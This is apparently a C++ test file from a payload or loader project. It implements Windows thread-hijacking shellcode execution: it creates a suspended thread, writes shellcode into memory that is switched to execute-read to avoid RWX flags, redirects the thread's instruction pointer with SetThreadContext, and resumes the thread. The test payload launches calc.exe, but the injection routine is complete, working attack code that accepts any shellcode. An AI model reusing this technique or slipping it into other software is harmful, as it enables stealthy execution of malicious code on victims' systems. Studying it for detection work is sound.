#include "hijack_test.h"
#include "core/steg/payload/payload_strategy.h"
#include "utils/file_logger.h"
#include <memory>
#include <windows.h>

namespace test {

// Dummy function that will be used for the sacrificial thread
VOID DummyFunction() {
    // Simple calculation to keep the function from being optimized out
    volatile int j = rand();
    volatile int i = j * j;
}

BOOL RunViaThreadHijacking(HANDLE hThread, PBYTE pShellcode, SIZE_T sShellcodeSize) {
    utils::FileLogger::log("[HijackTest] Starting thread hijack...");
    
    // Get thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_CONTROL;
    
    if (!GetThreadContext(hThread, &ctx)) {
        utils::FileLogger::log("[HijackTest] Failed to get thread context");
        return FALSE;
    }

    char logMsg[256];
    snprintf(logMsg, sizeof(logMsg), "[HijackTest] Original context - RIP: %p, RSP: %p, EFLAGS: %x",
        (void*)ctx.Rip, (void*)ctx.Rsp, ctx.EFlags);
    utils::FileLogger::log(logMsg);

    // Allocate memory for shellcode
    PVOID pMemory = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pMemory) {
        utils::FileLogger::log("[HijackTest] Failed to allocate memory");
        return FALSE;
    }

    snprintf(logMsg, sizeof(logMsg), "[HijackTest] Memory allocated at: %p", pMemory);
    utils::FileLogger::log(logMsg);

    // Copy shellcode
    memcpy(pMemory, pShellcode, sShellcodeSize);
    utils::FileLogger::log("[HijackTest] Shellcode copied to memory");

    // Change memory protection to RX only (not RWX)
    DWORD oldProtect;
    if (!VirtualProtect(pMemory, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        utils::FileLogger::log("[HijackTest] Failed to change memory protection");
        VirtualFree(pMemory, 0, MEM_RELEASE);
        return FALSE;
    }
    utils::FileLogger::log("[HijackTest] Memory protection changed to RX");

    // Only modify RIP, leave stack and flags alone
    ctx.Rip = (DWORD64)pMemory;

    snprintf(logMsg, sizeof(logMsg), "[HijackTest] Modified context - RIP: %p (original RSP and EFLAGS preserved)",
        (void*)ctx.Rip);
    utils::FileLogger::log(logMsg);

    // Set new thread context
    if (!SetThreadContext(hThread, &ctx)) {
        utils::FileLogger::log("[HijackTest] Failed to set thread context");
        VirtualFree(pMemory, 0, MEM_RELEASE);
        return FALSE;
    }

    utils::FileLogger::log("[HijackTest] Thread context updated successfully");
    return TRUE;
}

bool test_thread_hijack() {
    utils::FileLogger::log("[HijackTest] Creating sacrificial thread...");

    // Create suspended thread running dummy function
    HANDLE hThread = CreateThread(
        NULL,                   // Default security
        0,                      // Default stack size
        (LPTHREAD_START_ROUTINE)DummyFunction,
        NULL,                   // No parameters
        CREATE_SUSPENDED,       // Create suspended
        NULL                    // Don't need thread ID
    );

    if (!hThread) {
        utils::FileLogger::log("[HijackTest] Failed to create thread");
        return false;
    }
    utils::FileLogger::log("[HijackTest] Sacrificial thread created successfully");

    // Get calc shellcode
    paylo::CalcPayloadStrategy payload;
    auto shellcode = payload.getPayload();

    char logMsg[256];
    snprintf(logMsg, sizeof(logMsg), "[HijackTest] Shellcode size: %zu bytes", shellcode.size());
    utils::FileLogger::log(logMsg);

    // Hijack thread
    if (!RunViaThreadHijacking(hThread, shellcode.data(), shellcode.size())) {
        utils::FileLogger::log("[HijackTest] Thread hijacking failed");
        CloseHandle(hThread);
        return false;
    }

    // Resume thread to execute shellcode
    utils::FileLogger::log("[HijackTest] Resuming thread...");
    ResumeThread(hThread);

    // Wait briefly to see if calc.exe starts
    utils::FileLogger::log("[HijackTest] Waiting for calc.exe...");
    WaitForSingleObject(hThread, 2000);  // Wait up to 2 seconds

    // Get thread exit code
    DWORD exitCode;
    if (GetExitCodeThread(hThread, &exitCode)) {
        snprintf(logMsg, sizeof(logMsg), "[HijackTest] Thread exit code: %lu", exitCode);
        utils::FileLogger::log(logMsg);
    }

    CloseHandle(hThread);
    utils::FileLogger::log("[HijackTest] Test completed");
    return true;
}

void run_hijack_test() {
    utils::FileLogger::log("====== STARTING THREAD HIJACK TEST ======");
    
    if (!test_thread_hijack()) {
        utils::FileLogger::log("[HijackTest] Thread hijack test failed");
        utils::FileLogger::log("====== TEST SUITE FAILED ======");
        return;
    }
    
    utils::FileLogger::log("[HijackTest] Thread hijack test passed");
    utils::FileLogger::log("====== TEST SUITE PASSED ======");
}

} // namespace test